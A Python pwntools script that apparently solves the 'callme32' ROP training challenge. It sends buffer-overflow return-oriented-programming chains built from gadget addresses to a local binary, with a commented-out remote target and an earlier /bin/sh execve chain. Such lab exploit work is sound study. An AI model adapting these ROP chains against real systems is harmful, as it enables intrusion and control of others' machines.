from pwn import *
import sys

#########################################################
BINARY="./callme32"
ENV={}
GDB="break *main"
HOST="46.101.199.176"
PORT=8003
#########################################################

# context.terminal = "gnome-terminal"
r = process(BINARY)
# r = remote(HOST, PORT)
# binary = ELF(BINARY)

# Wait for debugger
pid = util.proc.pidof(r)[0]
print("The pid is: "+str(pid))
util.proc.wait_for_debugger(pid)

# gdb.attach(r)

# EAX = 0xb
# EBX = "pointer to /bin/sh"
# ECX = EDX = 0

# exploit = ("due\x00"+"a"*12).encode()+ p32(0x0804851d) + p32(0x0b) + p32(0x08048526) + p32(0x0804a02c) + p32(0x08048530) + p32(0x0) + p32(0x08048528) + p32(0x0) + p32(0x0804852d)


"""
0x0804A018 -- callme_one
0x0804A030 -- callme_two
0x0804A014 -- callme_three

0x08048579 -- single pop
0x080488aa -- double pop
0x080488a9 -- triple pop

0x080487b6 -- pwnme

"""

exploit = ("a"*(0x28 +0x4)).encode()
exploit += p32(0x080485c6) + p32(0x080488a9) + p32(0x1) + p32(0x2) + p32(0x3)
# exploit += p32(0x080488a9) # triple pop
exploit += p32(0x080487b6) # pwnme
r.sendline(exploit)
exploit = ("a"*(0x28 +0x4)).encode()
exploit += p32(0x08048626) + p32(0x080488a9)+ p32(0x1) + p32(0x2) + p32(0x3)
exploit += p32(0x080485b6) + p32(0x080488a9)+ p32(0x1) + p32(0x2) + p32(0x3)
r.sendline(exploit)

print(exploit)
print(len(exploit))

r.interactive()

